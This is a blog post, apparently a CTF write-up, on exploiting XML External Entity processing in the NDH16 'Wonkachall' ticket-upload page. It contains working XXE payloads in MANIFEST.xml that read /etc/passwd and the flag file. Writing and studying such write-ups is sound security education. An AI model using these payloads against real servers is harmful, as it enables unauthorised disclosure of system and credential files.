---
layout: post
title:  "XML External Entities: Wonkachall-step1 - NDH16"
date:   2018-07-03 22:00:00 +0200
comments: true
author: BoiteAKlou
categories:
- "Web"
---

This challenge covers one of the most efficient and popular attack against web servers. It is also the first of a series of 6 challenges from the NDH16 public CTF.

 <!--excerpt-->

# Table of Contents
{:.no_toc}

* TOC
{:toc}

## Challenge description

We have [a website](http://willywonka.shop:4242/) which is actually The Golden Ticket Blackmarket platform. It proposes a list of purchasable golden tickets where each ticket has a bitcoin cost, a name and an address.

![Wonka Shop screen capture]({{ "/assets/2018-07-03/tickets.png" | absolute_url }} "Willy Wonka Shop")

The challenge statement says that the flag is stored in ""/flags.txt". The objective is to take control of this website. Hurry up!

## Take my Golden Ticket!

The first reflex to have when you arrive on a website should be to hit "CTRL+U" and dive deep into the source code.
The vast majority of this website is static at the exception of the "/upload.php" page. We are able to upload a zip archive containing a **MANIFEST.xml** and a **Ticket** as shown in the provided example.

![Upload page screen capture]({{ "/assets/2018-07-03/upload.png" | absolute_url }} "Upload page"){:width="80%"}

The **Ticket file** contains a string representing the content of the Golden Ticket and the **MANIFEST.xml** stores the three variables displayed on the home page for each ticket, as shown below:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<root>
	<entreprise>xxx</entreprise>
	<prixBTC>xxx BTC</prixBTC>
	<adresseBTC>xxx</adresseBTC>
</root>
```

Wait a second... it means that the server is parsing XML files in order to get these values... Very interesting! :smiling_imp:

Have you ever heard of XML external entities?

## That's not a Ticket

XML External Entity Processing attack aim at exploiting **weakly configured XML parsers**. The objective is to reference external entities inside the XML document in order to **access local resources** or to **execute code remotely**.

Alright, now let's modify our MANIFEST.xml to detect if the website is vulnerable. I suggest the following payload, supposed to include "/etc/passwd" and to display it in place of the ticket's address:

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<root>
	<entreprise>xxx</entreprise>
	<prixBTC>xxx BTC</prixBTC>
	<adresseBTC>&xxe;</adresseBTC>
</root>
```

Then we zip the MANIFEST and the Ticket, we upload it and... :tada:

![XXE disclosure]({{ "/assets/2018-07-03/etcpasswd.png" | absolute_url }} "/etc/passwd"){:width="80%"}

Say Hello to the list of users!

Fine, now we can forge the payload that will allow us to retrieve the flag located under "/flag.txt". This is basically the same payload as before in which we replace the target file as follows:

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///flag.txt" >]>
<root>
	<entreprise>xxx</entreprise>
	<prixBTC>xxx BTC</prixBTC>
	<adresseBTC>&xxe;</adresseBTC>
</root>
```

And here comes the reward! :triangular_flag_on_post:

![XXE disclosure]({{ "/assets/2018-07-03/flag.png" | absolute_url }} "Flag"){:width="80%"}

You can now read the writeup of Wonkachall-step2 :wink:



BoiteAKlou :hammer:
